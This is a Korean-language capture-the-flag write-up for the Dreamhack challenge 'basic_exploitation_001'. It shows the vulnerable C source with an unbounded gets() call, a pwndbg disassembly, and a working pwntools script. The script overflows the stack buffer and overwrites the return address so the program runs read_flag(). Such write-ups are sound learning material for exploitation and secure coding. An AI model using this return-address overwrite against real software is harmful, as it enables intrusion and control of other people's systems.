# [basic_exploitation_001](https://dreamhack.io/wargame/challenges/3/) 
 
 문제 파일의 코드는 다음과 같다. 주석은 코드의 해석을 위하여 본인이 직접 작성한 것이다.

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0); // 표준 입력에서 버퍼를 사용하지 않는다. 버퍼를 지나지 않고 요청 즉시 작업이 진행된다. 
    setvbuf(stdout, NULL, _IONBF, 0); // 표준 출력에서 버퍼를 사용하지 않는다. 버퍼를 지나지 않고 요청 즉시 작업이 진행된다.

    signal(SIGALRM, alarm_handler); // SIGALRM이 발생하면 alarm_handler를 실행한다.
    alarm(30); // 30초 후에 SIGALRM을 발생시킴.
}


void read_flag() {
    system("cat /flag"); //shell 명령어 "cat /flag" 실행
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```

## Exploit strategy
 read_flag() 함수를 실행시켜 shell 명령어 "cat /flag"를 실행하는 것이 이 문제의 목표라고 할 수 있다. 우선 pwndbg를 통하여 주어진 바이너리 파일의 main함수를 disassemble하여 살펴보자. 
 ```assembly
   0x080485cc <+0>:     push   ebp
   0x080485cd <+1>:     mov    ebp,esp
   0x080485cf <+3>:     add    esp,0xffffff80
   0x080485d2 <+6>:     call   0x8048572 <initialize>
   0x080485d7 <+11>:    lea    eax,[ebp-0x80]
   0x080485da <+14>:    push   eax
   0x080485db <+15>:    call   0x80483d0 <gets@plt>
   0x080485e0 <+20>:    add    esp,0x4
   0x080485e3 <+23>:    mov    eax,0x0
   0x080485e8 <+28>:    leave
   0x080485e9 <+29>:    ret
```
lea eax,[ebp-0x80]를 보면 오버플로우를 발생시킬 버퍼는 ebp-0x80에 위치함을 알 수 있다. 스택 프레임의 구조를 떠올려보자. ebp에는 SFP가 저장되므로 ebp+0x4(공격 대상 컴퓨터는 32bit이므로 포인터 크기는 4바이트이기 때문이다.)에 return address가 저장될 것임을 알 수 있다.
return address의 값을 read_flag() 함수의 주소로 채워주면 이 문제의 목표인 shell 명령어 "cat /flag"를 실행할 수 있을 것이다. pwndbg를 통하여 read_flag()의 주소를 알아보자.
```
pwndbg> print read_flag
$1 = {<text variable, no debug info>} 0x80485b9 <read_flag>
```
주소는 0x80485b9이다. 이제 Exploit script를 작성해보자. 

## Exploit script

```python
# importing pwntools
from pwn import* 

# 원격서버를 대상으로 실제로 공격하므로 remote함수를 사용한다. 매개변수는 각각 호스트와 포트넘버이다.
p = remote('host1.dreamhack.games',15845) 

# 공격 대상 아키텍쳐는 x86
context.arch = 'i386' 

# payload 작성
payload = b"\x90"*132 # ebp+0x3까지 담을 더미 값 
payload += p32(0x80485b9) # return address에 들어갈 read_flag() 함수의 주소를 32bit packing(little endian의 byte 배열로 변경)

# payload + '\n'을 전송
p.sendline(payload) 

# 셸을 획득했으므로 interactive 함수 사용
p.interactive()
```
